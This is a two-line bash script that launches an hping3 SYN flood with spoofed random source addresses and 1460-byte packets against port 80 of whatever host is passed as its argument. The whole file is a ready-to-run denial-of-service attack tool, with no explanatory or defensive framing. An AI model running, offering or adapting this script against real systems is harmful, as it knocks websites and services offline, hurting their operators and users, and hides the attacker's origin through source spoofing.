#!/bin/bash
hping3 --rand-source --flood -S -d 1460 "$1" -p 80
